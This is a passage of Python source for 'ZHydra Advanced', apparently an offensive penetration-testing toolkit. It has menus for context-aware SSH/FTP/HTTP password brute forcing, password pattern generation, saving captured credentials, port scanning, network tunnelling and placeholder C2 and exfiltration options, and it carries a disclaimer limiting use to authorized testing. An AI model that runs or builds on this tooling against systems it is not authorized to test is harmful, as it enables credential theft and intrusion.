            print(f"{ZConfig.Colors.CYAN}╚══════════════════════════════════════════════╝{ZConfig.Colors.END}")

            choice = input(f"\n{ZConfig.Colors.GREEN}[?] Select option:{ZConfig.Colors.END} ").strip()

            if choice == '1':
                self.smart_brute_menu()
            elif choice == '2':
                self.network_scanner_menu()
            elif choice == '3':
                self.pivot_menu()
            elif choice == '4':
                self.vuln_menu()
            elif choice == '5':
                self.c2_menu()
            elif choice == '6':
                self.exfil_menu()
            elif choice == '7':
                self.pattern_generator_menu()
            elif choice == '8':
                self.settings_menu()
            elif choice == '9':
                self.help_menu()
            elif choice == '0':
                self.exit_program()
                break
            else:
                print(f"{ZConfig.Colors.RED}[!] Invalid choice!{ZConfig.Colors.END}")

    def smart_brute_menu(self):
        """Smart Brute Force menu - NO WORDLIST NEEDED!"""
        print(f"\n{ZConfig.Colors.CYAN}[ SMART BRUTE FORCE - NO WORDLIST ]{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.GREEN}[*] Generating passwords on-the-fly!{ZConfig.Colors.END}")

        # Get target
        target = input(f"{ZConfig.Colors.YELLOW}[?] Target IP/Hostname:{ZConfig.Colors.END} ").strip()

        if not self.validate_target(target):
            print(f"{ZConfig.Colors.RED}[!] Invalid target{ZConfig.Colors.END}")
            return

        # Get port
        port_input = input(f"{ZConfig.Colors.YELLOW}[?] Port (default 22):{ZConfig.Colors.END} ").strip()
        if not port_input:
            port = 22
        else:
            try:
                port = int(port_input)
            except:
                print(f"{ZConfig.Colors.RED}[!] Invalid port{ZConfig.Colors.END}")
                return

        # Auto-detect protocol
        protocol = self.detect_protocol(target, port)
        if protocol == 'unknown':
            # Let user choose
            print(f"\n{ZConfig.Colors.YELLOW}[?] Select protocol:{ZConfig.Colors.END}")
            protocols = list(self.brute.protocol_handlers.keys())
            for i, proto in enumerate(protocols[:10], 1):  # Show first 10
                print(f"  {i}. {proto}")

            try:
                proto_choice = int(input(f"\n{ZConfig.Colors.YELLOW}[?] Choice (1-{len(protocols[:10])}):{ZConfig.Colors.END} ").strip())
                protocol = protocols[proto_choice - 1]
            except:
                print(f"{ZConfig.Colors.RED}[!] Invalid choice, using SSH{ZConfig.Colors.END}")
                protocol = 'ssh'

        print(f"{ZConfig.Colors.GREEN}[*] Using protocol: {protocol}{ZConfig.Colors.END}")

        # Context hints for smarter generation
        print(f"\n{ZConfig.Colors.YELLOW}[?] Provide context hints (optional):{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.DIM}    (These help generate better passwords){ZConfig.Colors.END}")

        context = {}

        company = input(f"{ZConfig.Colors.YELLOW}[?] Company/Organization name:{ZConfig.Colors.END} ").strip()
        if company:
            context['company'] = company

        username_hint = input(f"{ZConfig.Colors.YELLOW}[?] Username hint (name, email, etc):{ZConfig.Colors.END} ").strip()
        if username_hint:
            context['username'] = username_hint

        birth_year = input(f"{ZConfig.Colors.YELLOW}[?] Birth year or important year:{ZConfig.Colors.END} ").strip()
        if birth_year:
            context['year'] = birth_year

        # Attack parameters
        print(f"\n{ZConfig.Colors.YELLOW}[?] Attack parameters:{ZConfig.Colors.END}")

        username = input(f"{ZConfig.Colors.YELLOW}[?] Specific username (or Enter for auto):{ZConfig.Colors.END} ").strip()
        if not username:
            username = None

        max_attempts = input(f"{ZConfig.Colors.YELLOW}[?] Max attempts (default 5000):{ZConfig.Colors.END} ").strip()
        if not max_attempts:
            max_attempts = 5000
        else:
            try:
                max_attempts = int(max_attempts)
            except:
                print(f"{ZConfig.Colors.RED}[!] Invalid number, using 5000{ZConfig.Colors.END}")
                max_attempts = 5000

        # Confirm attack
        print(f"\n{ZConfig.Colors.RED}{'='*60}{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.RED}[!] ABOUT TO LAUNCH SMART BRUTE FORCE{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Target: {target}:{port}{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Protocol: {protocol}{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Max attempts: {max_attempts:,}{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Mode: AI-Powered Pattern Generation{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.RED}{'='*60}{ZConfig.Colors.END}")

        confirm = input(f"\n{ZConfig.Colors.RED}[?] Confirm attack? (YES/no):{ZConfig.Colors.END} ").strip().upper()

        if confirm == 'YES':
            # Start smart attack
            results = self.brute.smart_attack(
                target=target,
                port=port,
                protocol=protocol,
                username=username,
                context_hints=context,
                max_attempts=max_attempts
            )

            # Save results
            if results:
                self.save_results(results, target, protocol)
        else:
            print(f"{ZConfig.Colors.YELLOW}[*] Attack cancelled{ZConfig.Colors.END}")

    def pattern_generator_menu(self):
        """Password pattern generator"""
        print(f"\n{ZConfig.Colors.CYAN}[ PATTERN GENERATOR ]{ZConfig.Colors.END}")

        print("  1. Generate common password patterns")
        print("  2. Generate based on word/name")
        print("  3. Generate combinatorial passwords")
        print("  4. Save patterns to file")
        print("  5. Back to main menu")

        choice = input(f"\n{ZConfig.Colors.GREEN}[?] Select option:{ZConfig.Colors.END} ").strip()

        if choice == '1':
            count = input(f"{ZConfig.Colors.YELLOW}[?] How many patterns? (default 100):{ZConfig.Colors.END} ").strip()
            count = int(count) if count.isdigit() else 100

            print(f"\n{ZConfig.Colors.GREEN}[*] Generating {count} common patterns...{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.CYAN}{'-'*50}{ZConfig.Colors.END}")

            generator = self.brute.smart_engine.generate_smart_patterns()
            for i, password in enumerate(generator):
                if i >= count:
                    break
                print(f"  {i+1:4d}. {password}")

            print(f"{ZConfig.Colors.CYAN}{'-'*50}{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.GREEN}[+] Generated {min(count, 100)} patterns{ZConfig.Colors.END}")

        elif choice == '2':
            base_word = input(f"{ZConfig.Colors.YELLOW}[?] Base word/name:{ZConfig.Colors.END} ").strip()

            count = input(f"{ZConfig.Colors.YELLOW}[?] How many variations? (default 50):{ZConfig.Colors.END} ").strip()
            count = int(count) if count.isdigit() else 50

            print(f"\n{ZConfig.Colors.GREEN}[*] Generating {count} variations of '{base_word}'...{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.CYAN}{'-'*50}{ZConfig.Colors.END}")

            generator = self.brute.smart_engine.generate_smart_patterns(base_word)
            for i, password in enumerate(generator):
                if i >= count:
                    break
                print(f"  {i+1:4d}. {password}")

            print(f"{ZConfig.Colors.CYAN}{'-'*50}{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.GREEN}[+] Generated {min(count, 50)} variations{ZConfig.Colors.END}")

        elif choice == '3':
            length = input(f"{ZConfig.Colors.YELLOW}[?] Max length? (default 4):{ZConfig.Colors.END} ").strip()
            length = int(length) if length.isdigit() else 4

            char_set = input(f"{ZConfig.Colors.YELLOW}[?] Character set (basic_all/extended/hex):{ZConfig.Colors.END} ").strip()
            if char_set not in ZConfig.CHAR_SETS:
                char_set = 'basic_all'

            count = input(f"{ZConfig.Colors.YELLOW}[?] How many? (default 100):{ZConfig.Colors.END} ").strip()
            count = int(count) if count.isdigit() else 100

            print(f"\n{ZConfig.Colors.GREEN}[*] Generating {count} combinatorial passwords...{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.CYAN}{'-'*50}{ZConfig.Colors.END}")

            generator = self.brute.smart_engine.generate_combinatorial(length, char_set)
            for i, password in enumerate(generator):
                if i >= count:
                    break
                print(f"  {i+1:4d}. {password}")

            print(f"{ZConfig.Colors.CYAN}{'-'*50}{ZConfig.Colors.END}")
            print(f"{ZConfig.Colors.GREEN}[+] Generated {min(count, 100)} passwords{ZConfig.Colors.END}")

        elif choice == '4':
            self.save_patterns_to_file()

        elif choice == '5':
            return

    def save_patterns_to_file(self):
        """Save generated patterns to file"""
        filename = input(f"{ZConfig.Colors.YELLOW}[?] Filename (default: zhydra_patterns.txt):{ZConfig.Colors.END} ").strip()
        if not filename:
            filename = "zhydra_patterns.txt"

        count = input(f"{ZConfig.Colors.YELLOW}[?] How many patterns? (default 1000):{ZConfig.Colors.END} ").strip()
        count = int(count) if count.isdigit() else 1000

        print(f"\n{ZConfig.Colors.GREEN}[*] Generating {count} patterns...{ZConfig.Colors.END}")

        with open(filename, 'w') as f:
            generator = self.brute.smart_engine.generate_smart_patterns()
            for i, password in enumerate(generator):
                if i >= count:
                    break
                f.write(password + '\n')

                # Progress
                if i % 100 == 0:
                    sys.stdout.write(f"\rGenerated: {i}/{count} patterns")
                    sys.stdout.flush()

        print(f"\n{ZConfig.Colors.GREEN}[+] Saved {min(count, 1000)} patterns to {filename}{ZConfig.Colors.END}")

    def save_results(self, results: List[Dict], target: str, protocol: str):
        """Save attack results"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{self.config.OUTPUT_DIR}/{target}_{protocol}_{timestamp}.json"

        result_data = {
            'timestamp': datetime.now().isoformat(),
            'tool': self.config.TOOL_NAME,
            'version': self.config.VERSION,
            'target': target,
            'protocol': protocol,
            'credentials_found': len(results),
            'credentials': results,
            'stats': self.brute.smart_engine.get_progress()
        }

        try:
            with open(filename, 'w') as f:
                json.dump(result_data, f, indent=2, default=str)

            print(f"\n{ZConfig.Colors.GREEN}[+] Results saved to: {filename}{ZConfig.Colors.END}")

        except Exception as e:
            print(f"{ZConfig.Colors.RED}[-] Error saving results: {e}{ZConfig.Colors.END}")

    def validate_target(self, target: str) -> bool:
        """Validate target"""
        try:
            socket.inet_aton(target)
            return True
        except socket.error:
            pass

        try:
            socket.gethostbyname(target)
            return True
        except socket.gaierror:
            pass

        return False

    def detect_protocol(self, target: str, port: int) -> str:
        """Detect protocol from port"""
        for proto, default_port in self.config.DEFAULT_PORTS.items():
            if port == default_port:
                return proto

        return 'unknown'

    def network_scanner_menu(self):
        """Network scanner menu"""
        print(f"\n{ZConfig.Colors.CYAN}[ NETWORK SCANNER ]{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Basic port scanner{ZConfig.Colors.END}")

        target = input(f"{ZConfig.Colors.YELLOW}[?] Target IP:{ZConfig.Colors.END} ").strip()

        if not self.validate_target(target):
            print(f"{ZConfig.Colors.RED}[!] Invalid target{ZConfig.Colors.END}")
            return

        print(f"\n{ZConfig.Colors.GREEN}[*] Scanning common ports on {target}...{ZConfig.Colors.END}")

        open_ports = []

        for service, port in list(self.config.DEFAULT_PORTS.items())[:20]:  # Scan first 20 ports
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()

                if result == 0:
                    open_ports.append((port, service))
                    print(f"{ZConfig.Colors.GREEN}[+] Port {port} ({service}) - OPEN{ZConfig.Colors.END}")
                else:
                    print(f"{ZConfig.Colors.DIM}[-] Port {port} ({service}) - CLOSED{ZConfig.Colors.END}")

            except:
                print(f"{ZConfig.Colors.DIM}[-] Port {port} ({service}) - ERROR{ZConfig.Colors.END}")

        if open_ports:
            print(f"\n{ZConfig.Colors.GREEN}[+] Found {len(open_ports)} open ports:{ZConfig.Colors.END}")
            for port, service in open_ports:
                print(f"    {port} - {service}")
        else:
            print(f"\n{ZConfig.Colors.RED}[-] No open ports found{ZConfig.Colors.END}")

    def pivot_menu(self):
        """Pivot menu"""
        print(f"\n{ZConfig.Colors.CYAN}[ NETWORK PIVOTING ]{ZConfig.Colors.END}")

        print("  1. Create tunnel")
        print("  2. List tunnels")
        print("  3. Close tunnel")
        print("  4. Back to main")

        choice = input(f"\n{ZConfig.Colors.GREEN}[?] Select option:{ZConfig.Colors.END} ").strip()

        if choice == '1':
            local_port = input(f"{ZConfig.Colors.YELLOW}[?] Local port:{ZConfig.Colors.END} ").strip()
            target_host = input(f"{ZConfig.Colors.YELLOW}[?] Target host:{ZConfig.Colors.END} ").strip()
            target_port = input(f"{ZConfig.Colors.YELLOW}[?] Target port:{ZConfig.Colors.END} ").strip()

            try:
                local_port = int(local_port)
                target_port = int(target_port)

                if self.pivot.create_tunnel(local_port, target_host, target_port):
                    print(f"{ZConfig.Colors.GREEN}[+] Tunnel created!{ZConfig.Colors.END}")
                    print(f"{ZConfig.Colors.YELLOW}[*] Connect to: localhost:{local_port}{ZConfig.Colors.END}")
                else:
                    print(f"{ZConfig.Colors.RED}[-] Failed to create tunnel{ZConfig.Colors.END}")

            except:
                print(f"{ZConfig.Colors.RED}[!] Invalid input{ZConfig.Colors.END}")

        elif choice == '2':
            tunnels = self.pivot.list_tunnels()
            if tunnels:
                print(f"\n{ZConfig.Colors.GREEN}Active tunnels:{ZConfig.Colors.END}")
                for local, target in tunnels.items():
                    print(f"    {local} -> {target}")
            else:
                print(f"{ZConfig.Colors.YELLOW}[!] No active tunnels{ZConfig.Colors.END}")

        elif choice == '3':
            port = input(f"{ZConfig.Colors.YELLOW}[?] Port to close:{ZConfig.Colors.END} ").strip()
            try:
                port = int(port)
                if self.pivot.close_tunnel(port):
                    print(f"{ZConfig.Colors.GREEN}[+] Tunnel closed{ZConfig.Colors.END}")
                else:
                    print(f"{ZConfig.Colors.RED}[-] Tunnel not found{ZConfig.Colors.END}")
            except:
                print(f"{ZConfig.Colors.RED}[!] Invalid port{ZConfig.Colors.END}")

    def vuln_menu(self):
        """Vulnerability menu"""
        print(f"\n{ZConfig.Colors.CYAN}[ VULNERABILITY ASSESSMENT ]{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Basic vulnerability checks{ZConfig.Colors.END}")

        target = input(f"{ZConfig.Colors.YELLOW}[?] Target IP:{ZConfig.Colors.END} ").strip()

        if not self.validate_target(target):
            print(f"{ZConfig.Colors.RED}[!] Invalid target{ZConfig.Colors.END}")
            return

        print(f"\n{ZConfig.Colors.GREEN}[*] Running basic checks on {target}...{ZConfig.Colors.END}")

        # Check common vulnerabilities
        vulns = []

        # Check for default credentials
        print(f"{ZConfig.Colors.YELLOW}[*] Checking for default credentials...{ZConfig.Colors.END}")

        # Check SSH
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, 22))
            sock.close()

            if result == 0:
                vulns.append({
                    'port': 22,
                    'service': 'SSH',
                    'vulnerability': 'SSH service exposed',
                    'severity': 'Medium'
                })
        except:
            pass

        # Check HTTP
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, 80))
            sock.close()

            if result == 0:
                vulns.append({
                    'port': 80,
                    'service': 'HTTP',
                    'vulnerability': 'Web server exposed',
                    'severity': 'Low'
                })
        except:
            pass

        if vulns:
            print(f"\n{ZConfig.Colors.RED}[!] Found {len(vulns)} potential vulnerabilities:{ZConfig.Colors.END}")
            for vuln in vulns:
                print(f"    {vuln['port']} ({vuln['service']}): {vuln['vulnerability']} - {vuln['severity']}")
        else:
            print(f"\n{ZConfig.Colors.GREEN}[+] No obvious vulnerabilities found{ZConfig.Colors.END}")

    def c2_menu(self):
        """C2 menu"""
        print(f"\n{ZConfig.Colors.CYAN}[ COMMAND & CONTROL ]{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Basic C2 Server{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.RED}[!] Feature under development{ZConfig.Colors.END}")

    def exfil_menu(self):
        """Exfiltration menu"""
        print(f"\n{ZConfig.Colors.CYAN}[ DATA EXFILTRATION ]{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.YELLOW}[*] Basic data exfiltration{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.RED}[!] Feature under development{ZConfig.Colors.END}")

    def settings_menu(self):
        """Settings menu"""
        print(f"\n{ZConfig.Colors.CYAN}[ SETTINGS ]{ZConfig.Colors.END}")

        print(f"  1. Max Workers: {self.config.MAX_WORKERS}")
        print(f"  2. Timeout: {self.config.CONNECTION_TIMEOUT}s")
        print(f"  3. Output Directory: {self.config.OUTPUT_DIR}")
        print(f"  4. Back to main")

        choice = input(f"\n{ZConfig.Colors.GREEN}[?] Select option:{ZConfig.Colors.END} ").strip()

        if choice == '1':
            new_value = input(f"{ZConfig.Colors.YELLOW}[?] New Max Workers (1-32):{ZConfig.Colors.END} ").strip()
            try:
                value = int(new_value)
                if 1 <= value <= 32:
                    self.config.MAX_WORKERS = value
                    print(f"{ZConfig.Colors.GREEN}[+] Updated{ZConfig.Colors.END}")
                else:
                    print(f"{ZConfig.Colors.RED}[!] Must be between 1-32{ZConfig.Colors.END}")
            except:
                print(f"{ZConfig.Colors.RED}[!] Invalid value{ZConfig.Colors.END}")

        elif choice == '2':
            new_value = input(f"{ZConfig.Colors.YELLOW}[?] New Timeout (1-60 seconds):{ZConfig.Colors.END} ").strip()
            try:
                value = int(new_value)
                if 1 <= value <= 60:
                    self.config.CONNECTION_TIMEOUT = value
                    print(f"{ZConfig.Colors.GREEN}[+] Updated{ZConfig.Colors.END}")
                else:
                    print(f"{ZConfig.Colors.RED}[!] Must be between 1-60{ZConfig.Colors.END}")
            except:
                print(f"{ZConfig.Colors.RED}[!] Invalid value{ZConfig.Colors.END}")

    def help_menu(self):
        """Help menu"""
        help_text = f"""
{ZConfig.Colors.CYAN}╔══════════════════ ZHYDRA HELP ══════════════════╗{ZConfig.Colors.END}

{ZConfig.Colors.YELLOW}ABOUT ZHYDRA ADVANCED:{ZConfig.Colors.END}
ZHydra Advanced is a next-generation penetration testing toolkit
that uses AI-powered pattern generation for brute force attacks.
NO WORDLISTS NEEDED - it generates passwords on-the-fly!

{ZConfig.Colors.GREEN}KEY FEATURES:{ZConfig.Colors.END}
1. Smart Brute Force - Algorithmic password generation
2. Context-Aware - Uses hints for better password creation
3. Multi-Protocol - SSH, FTP, HTTP, MySQL, and more
4. Termux Optimized - Works without root on Android
5. Professional Grade - Advanced techniques for authorized testing

{ZConfig.Colors.YELLOW}SMART BRUTE FORCE PATTERNS:{ZConfig.Colors.END}
• Leet speak variations (4dm1n, p4ssw0rd)
• Common number suffixes (123, 2024, 007)
• Special character combinations (!@#, $%^&)
• Capitalization patterns (Admin, ADMIN, aDmIn)
• Context-based generation (company names, years, etc.)

{ZConfig.Colors.MAGENTA}SUPPORTED PROTOCOLS:{ZConfig.Colors.END}
• SSH (port 22)          • FTP (port 21)
• HTTP/HTTPS (80/443)    • Telnet (port 23)
• MySQL (port 3306)      • SMTP (port 25)
• And more...

{ZConfig.Colors.RED}LEGAL DISCLAIMER:{ZConfig.Colors.END}
⚠️  This tool is for AUTHORIZED security testing ONLY!
⚠️  Always obtain WRITTEN PERMISSION before testing
⚠️  Unauthorized access is ILLEGAL and UNETHICAL
⚠️  You are 100% responsible for your own actions

{ZConfig.Colors.CYAN}RECOMMENDED USE CASES:{ZConfig.Colors.END}
• CTF competitions and security challenges
• Authorized penetration tests with permission
• Security training in controlled labs
• Testing your own systems and networks

{ZConfig.Colors.GREEN}Stay ethical, stay legal, stay secure!{ZConfig.Colors.END}
{ZConfig.Colors.CYAN}╚══════════════════════════════════════════════╝{ZConfig.Colors.END}
        """

        print(help_text)

    def exit_program(self):
        """Exit program cleanly"""
        print(f"\n{ZConfig.Colors.GREEN}[*] Cleaning up...{ZConfig.Colors.END}")

        # Close all tunnels
        tunnels = self.pivot.list_tunnels()
        for port in list(tunnels.keys()):
            self.pivot.close_tunnel(port)

        print(f"{ZConfig.Colors.YELLOW}[*] Thank you for using ZHydra Advanced!{ZConfig.Colors.END}")
        print(f"{ZConfig.Colors.CYAN}[*] Remember: With great power comes great responsibility.{ZConfig.Colors.END}")
        sys.exit(0)

# ========== MAIN ENTRY POINT ==========
def main():
    """Main entry point"""
    try:
        # Check Python version
        if sys.version_info < (3, 7):
            print(f"{ZConfig.Colors.RED}[!] Python 3.7 or higher required!{ZConfig.Colors.END}")
            sys.exit(1)

        # Create and run ZHydra
        zhydra = ZHydraAdvanced()
        zhydra.interactive_menu()

    except KeyboardInterrupt:
        print(f"\n\n{ZConfig.Colors.YELLOW}[!] Interrupted by user{ZConfig.Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{ZConfig.Colors.RED}[✗] Fatal error: {str(e)}{ZConfig.Colors.END}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
